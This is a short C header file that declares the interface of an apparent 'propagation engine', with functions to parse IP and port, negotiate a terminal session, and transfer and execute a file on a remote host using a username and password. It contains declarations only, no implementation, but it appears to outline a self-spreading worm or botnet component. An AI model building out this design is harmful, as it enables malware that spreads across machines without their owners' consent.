#ifndef _PROPAGATIONENGINE_H
#define _PROPAGATIONENGINE_H

void parseIPPort(char buffer[], char paramPORT[]);
void fileTransfer(char *ip, char *username, char *pass);
void negotiate(int sock, unsigned char *buf, int len);
static void terminalSet();
static void terminalReset();
void fileExecute(char *ip, char* username, char *passwrd);
void propagation_engine(char* ip, char *username, char *pass);

#endif
